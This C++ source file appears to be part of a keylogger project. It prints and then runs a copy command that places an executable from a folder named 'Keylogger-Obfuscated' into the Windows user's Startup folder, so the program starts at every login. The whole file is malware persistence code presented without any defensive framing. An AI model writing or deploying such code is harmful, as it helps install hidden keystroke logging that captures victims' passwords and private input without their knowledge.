#include <iostream>
using namespace std;

#include <windows.h>
#include <stdio.h>

int main()
{
	cout << "copy e:\\CPP-Key-Logger\\Keylogger-Obfuscated\\client.exe \"c:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"" << endl;
	cout << endl;
	system("copy e:\\CPP-Key-Logger\\Keylogger-Obfuscated\\client.exe \"c:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");

	return 1;
}